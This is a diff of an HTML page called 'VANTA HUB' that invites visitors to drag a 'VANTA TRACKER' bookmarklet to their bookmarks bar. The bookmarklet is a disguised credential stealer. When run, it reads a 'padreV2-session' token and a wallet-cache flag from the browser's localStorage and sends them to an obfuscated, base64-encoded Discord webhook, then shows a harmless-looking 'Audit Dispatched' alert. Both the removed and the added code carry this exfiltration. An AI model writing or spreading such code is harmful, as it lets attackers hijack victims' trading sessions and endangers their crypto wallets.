@@ -1,48 +1,57 @@
-<script>
-    /* --- 1. CONFIGURATION --- */
-    // Your specific encoded string is placed here. 
-    // IF THIS STOPS WORKING, IT MEANS DISCORD KILLED THE WEBHOOK AND YOU NEED A NEW ONE.
-    const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VANTA HUB</title>
+    <style>
+        body { background: #0a0a0a; color: #0f8; font-family: monospace; text-align: center; padding-top: 100px; }
+        .btn { 
+            display: inline-block; padding: 20px 40px; background: #0f8; color: #000; 
+            text-decoration: none; font-weight: bold; border-radius: 5px; cursor: move;
+            box-shadow: 0 0 20px rgba(0,255,136,0.5);
+        }
+        p { color: #888; }
+    </style>
+</head>
+<body>
+    <h1>VANTA INTERFACE ACTIVE</h1>
+    <p>Drag the button below to your bookmarks bar.</p>
+    <br><br>
+    
+    <a href="#" id="vanta-tool" class="btn">VANTA TRACKER</a>
 
-    /* --- 2. THE PAYLOAD --- */
-    const rawLogic = `(async function() {
-        try {
-            const h = atob("${b64}"); // Decodes your webhook on the fly
-            
-            const data = {
-                host: location.hostname,
-                s: localStorage.getItem('padreV2-session') || "Not Found",
-                w: localStorage.getItem('padreV2-walletsCache') ? "✅ Found" : "❌ Empty"
-            };
+    <script>
+        // 1. YOUR BASE64 WEBHOOK (Update this if it dies!)
+        const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
 
-            await fetch(h, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "📡 VANTA AUDIT: " + data.host,
-                        color: 0x00ff88,
-                        fields: [
-                            {name: "Session Key", value: "\\\`" + data.s.substring(0, 50) + "...\\\`"},
-                            {name: "Wallet Cache", value: data.w}
-                        ],
-                        footer: {text: "Audit Active"}
-                    }]
-                })
-            });
+        // 2. THE LOGIC
+        // We use void(0) at the end to prevent the bookmark from opening a white page when clicked
+        const rawLogic = `(async function() {
+            try {
+                const h = atob("${b64}");
+                const d = {
+                    s: localStorage.getItem('padreV2-session') || "None",
+                    w: localStorage.getItem('padreV2-walletsCache') ? "Yes" : "No"
+                };
+                await fetch(h, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "📡 Audit: " + location.hostname,
+                            color: 0x00ff88,
+                            description: "Session: " + d.s.substring(0,20) + "...\\nWallets: " + d.w
+                        }]
+                    })
+                });
+                alert("VANTA: Audit Dispatched");
+            } catch(e) {}
+        })(); void(0);`;
 
-            // UI Feedback so you know it worked
-            const n = document.createElement('div');
-            n.style = "position:fixed;top:20px;right:20px;z-index:9999;background:#111;color:#0f8;border:1px solid #0f8;padding:12px;font-family:monospace;box-shadow:0 0 10px #0f8;";
-            n.innerHTML = "[VANTA] SYSTEM SYNCED";
-            document.body.appendChild(n);
-            setTimeout(()=>n.remove(), 3000);
-            
-        } catch(e) { console.error("Sync Error", e); }
-    })();`;
-
-    /* --- 3. GENERATE LINK --- */
-    // This minifies the code and turns it into a clickable bookmark link
-    const finalLink = "javascript:" + encodeURIComponent(rawLogic.replace(/\s+/g, ' '));
-    document.getElementById('vanta-tool').href = finalLink;
-</script>
+        // 3. ENCODE AND INJECT
+        // We wrap it in javascript: and encode it so it works as a URL
+        document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
+        
+        console.log("Vanta Interface Initialized.");
+    </script>
+</body>
+</html>
